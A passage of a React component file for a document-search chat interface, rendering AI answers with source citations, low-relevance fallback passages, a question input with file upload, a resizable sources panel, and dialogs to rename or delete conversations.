                            className="flex items-center gap-2 text-xs font-medium text-red-700 hover:text-red-900 transition-colors disabled:opacity-50"
                          >
                            <RefreshCw size={12} aria-hidden="true" /> Try again
                          </button>
                        )}

                        {msg.role === 'ai' && !msg.error && msg.citations && msg.citations.length > 0 && (
                          <div className="space-y-2 pt-1">
                            <p className="text-xs font-medium text-slate-500">Sources</p>
                            {Array.from(new Map(msg.citations.map(c => [citationKey(c), c])).values()).map((c, cIdx) => (
                              <div key={cIdx} className="p-3 rounded-xl bg-slate-50/80 border border-slate-200/90">
                                <div className="flex items-center gap-2 min-w-0">
                                  <span className="text-xs font-semibold text-indigo-600 font-headline shrink-0">{c.evidence_id ? c.evidence_id : `E${cIdx + 1}`}</span>
                                  <button
                                    type="button"
                                    onClick={() => openCitation(msg.citations!.filter(orig => citationKey(orig) === citationKey(c)), 0)}
                                    className="inline-flex items-center gap-1.5 text-xs text-slate-700 hover:text-indigo-600 transition-colors bg-white px-2 py-1 rounded-md border border-slate-200 shadow-xs min-w-0"
                                  >
                                    <Link2 size={12} className="text-slate-400 shrink-0" aria-hidden="true" />
                                    <span className="truncate">{citationLabel(c)}</span>
                                  </button>
                                </div>
                                <p className="text-sm text-slate-600 leading-relaxed mt-2 line-clamp-2">{c.content}</p>
                              </div>
                            ))}
                          </div>
                        )}

                        {msg.role === 'ai' && !msg.error && msg.closest_matches && msg.closest_matches.length > 0 && (
                          <div className="space-y-2 pt-4 mt-4 border-t border-slate-100">
                            <p className="text-xs font-semibold text-amber-800 flex items-center gap-1.5">
                              <AlertCircle size={14} aria-hidden="true" /> Closest passages found (low relevance)
                            </p>
                            {msg.closest_matches.map((c, cIdx) => (
                              <div key={`fallback-${cIdx}`} className="p-3 rounded-xl bg-amber-50/50 border border-amber-200/90">
                                <button
                                  type="button"
                                  onClick={() => openCitation([c], 0)}
                                  className="inline-flex items-center gap-1.5 text-xs text-slate-700 hover:text-amber-800 transition-colors bg-white px-2 py-1 rounded-md border border-slate-200 shadow-xs min-w-0 max-w-full"
                                >
                                  <Link2 size={12} className="text-slate-400 shrink-0" aria-hidden="true" />
                                  <span className="truncate">{citationLabel(c)}</span>
                                </button>
                                <p className="text-sm text-slate-600 leading-relaxed mt-2 line-clamp-2">{c.content}</p>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    </article>
                  ))}

                  <div aria-live="polite" className="sr-only">
                    {isProcessing ? 'Searching your documents…' : ''}
                  </div>
                  {isProcessing && (
                    <div className="flex gap-3 sm:gap-4 items-center text-sm text-slate-500" aria-hidden="true">
                      <span className="w-8 h-8 rounded-lg bg-indigo-50 border border-indigo-100 flex items-center justify-center"><Loader2 className="w-4 h-4 text-indigo-600 animate-spin" /></span>
                      Searching your documents…
                    </div>
                  )}
                  <div ref={messagesEndRef} />
                </div>
              </div>

              <form
                className="p-3 sm:p-4 bg-white border-t border-slate-200"
                onSubmit={e => { e.preventDefault(); handleSendMessage(); }}
              >
                <div className="max-w-3xl mx-auto">
                  <div className="flex items-end bg-white border border-slate-300 rounded-xl focus-within:border-indigo-500 focus-within:ring-2 focus-within:ring-indigo-100 transition-colors shadow-xs">
                    <button
                      type="button"
                      onClick={() => fileInputRef.current?.click()}
                      disabled={isUploading}
                      className="p-3 text-slate-500 hover:text-slate-800 transition-colors disabled:opacity-50"
                      aria-label={isUploading ? 'Uploading documents' : 'Upload documents to this box'}
                    >
                      {isUploading ? <Loader2 size={20} className="animate-spin" aria-hidden="true" /> : <Paperclip size={20} aria-hidden="true" />}
                    </button>
                    <label htmlFor="chat-input" className="sr-only">Ask a question about the documents in this box</label>
                    <textarea
                      id="chat-input"
                      ref={inputRef}
                      rows={1}
                      className="flex-1 resize-none bg-transparent border-0 text-sm text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-0 py-3.5 px-1 leading-5"
                      style={{ maxHeight: MAX_INPUT_HEIGHT }}
                      placeholder="Ask a question about this box…"
                      value={inputText}
                      onChange={e => { setInputText(e.target.value); resizeInput(); }}
                      onKeyDown={e => {
                        // Enter sends, Shift+Enter adds a line; ignore Enter while an IME is composing.
                        if (e.key === 'Enter' && !e.shiftKey && !e.nativeEvent.isComposing) {
                          e.preventDefault();
                          handleSendMessage();
                        }
                      }}
                      aria-describedby="chat-input-hint"
                    />
                    <div className="p-2">
                      <button
                        type="submit"
                        disabled={isProcessing || !inputText.trim()}
                        className="p-2 rounded-lg bg-indigo-600 hover:bg-indigo-700 text-white transition-colors flex items-center justify-center shadow-xs disabled:opacity-50 disabled:cursor-not-allowed"
                        aria-label="Send question"
                      >
                        {isProcessing ? <Loader2 size={16} className="animate-spin" aria-hidden="true" /> : <Send size={16} aria-hidden="true" />}
                      </button>
                    </div>
                  </div>
                  <p id="chat-input-hint" className="hidden sm:block mt-1.5 text-[11px] text-slate-500 text-center">
                    Enter to send · Shift+Enter for a new line
                  </p>
                </div>
              </form>
            </section>

            {/* ── Sources (desktop) ── */}
            {panels.sourceOpen ? (
              <aside aria-label="Sources" style={{ width: panels.sourceWidth }} className="relative shrink-0 border-l border-slate-200 bg-white hidden md:flex flex-col min-h-0">
                <div onMouseDown={e => startResize(e, 'source')} className="absolute top-0 -left-1 w-2 h-full cursor-col-resize z-10 group" aria-hidden="true">
                  <div className="mx-auto w-0.5 h-full bg-transparent group-hover:bg-indigo-400 transition-colors" />
                </div>
                <div className="h-12 px-4 border-b border-slate-200 flex items-center justify-between gap-2 shrink-0 bg-slate-50/50">
                  <h2 className="flex items-center gap-2 min-w-0 text-xs font-semibold text-slate-900 tracking-tight font-headline">
                    <BookOpen className="w-4 h-4 text-indigo-600 shrink-0" aria-hidden="true" />
                    <span className="truncate">{sourceTitle}</span>
                  </h2>
                  <div className="flex items-center gap-2 shrink-0">
                    {activeSource && activeSource.citations.length > 1 && (
                      <span className="text-[11px] font-mono text-slate-600 px-2 py-0.5 rounded bg-white border border-slate-200">
                        {activeSource.focusIdx + 1} / {activeSource.citations.length}
                      </span>
                    )}
                    <button type="button" onClick={toggleSources} className="p-1 rounded text-slate-500 hover:text-slate-700 hover:bg-slate-100 transition-colors" aria-label="Hide sources">
                      <PanelRightClose size={15} aria-hidden="true" />
                    </button>
                  </div>
                </div>
                <div className="flex-1 overflow-y-auto p-5">{renderSources('panel')}</div>
              </aside>
            ) : (
              <div className="w-12 shrink-0 border-l border-slate-200 bg-slate-50/50 hidden md:flex flex-col items-center py-3 gap-2">
                <button type="button" onClick={toggleSources} className="relative p-2 rounded-lg text-slate-500 hover:text-indigo-600 hover:bg-white border border-transparent hover:border-slate-200 transition-colors" aria-label="Show sources">
                  <BookOpen size={18} aria-hidden="true" />
                  {activeSource && <span className="absolute top-1 right-1 w-1.5 h-1.5 rounded-full bg-indigo-600" aria-hidden="true" />}
                </button>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ── Mobile sheets ── */}
      <Dialog open={mobilePanel === 'history'} onClose={() => setMobilePanel(null)} title="Conversations" size="lg">
        <button type="button" onClick={startNewChat} className={`${buttonStyles.secondary} w-full mb-3`}>
          <Plus size={14} className="text-indigo-600" aria-hidden="true" /> New conversation
        </button>
        {renderHistoryList()}
      </Dialog>
      <Dialog open={mobilePanel === 'sources'} onClose={() => setMobilePanel(null)} title={sourceTitle} size="lg">
        {renderSources('sheet')}
      </Dialog>

      {/* ── Conversation dialogs ── */}
      <Dialog
        open={renameTarget !== null}
        onClose={() => setRenameTarget(null)}
        title="Rename conversation"
        size="sm"
        dismissible={!renaming}
        footer={
          <>
            <button type="button" onClick={() => setRenameTarget(null)} disabled={renaming} className={buttonStyles.secondary}>Cancel</button>
            <button type="submit" form="rename-chat-form" disabled={renaming || !renameValue.trim()} className={buttonStyles.primary}>
              {renaming && <Loader2 size={16} className="animate-spin" aria-hidden="true" />}
              Save
            </button>
          </>
        }
      >
        <form id="rename-chat-form" onSubmit={submitRename} className="space-y-2">
          <label htmlFor="rename-chat-input" className="text-sm font-semibold text-slate-900 block">Name</label>
          <input
            id="rename-chat-input"
            value={renameValue}
            onChange={e => { setRenameValue(e.target.value); setRenameError(null); }}
            maxLength={100}
            className="w-full bg-white border border-slate-300 rounded-lg px-3.5 py-2.5 text-sm text-slate-900 focus:outline-none focus:border-indigo-600 focus:ring-2 focus:ring-indigo-600/15"
            aria-invalid={renameError ? true : undefined}
            aria-describedby={renameError ? 'rename-chat-error' : undefined}
          />
          {renameError && <p id="rename-chat-error" role="alert" className="text-sm text-red-700">{renameError}</p>}
        </form>
      </Dialog>

      <ConfirmDialog
        open={deleteTarget !== null}
        title="Delete conversation?"
        description={<>“{deleteTarget?.title}” will be permanently deleted. Your documents are not affected.</>}
        confirmLabel="Delete conversation"
        destructive
        onConfirm={confirmDeleteChat}
        onClose={() => setDeleteTarget(null)}
      />
    </div>
  );
}
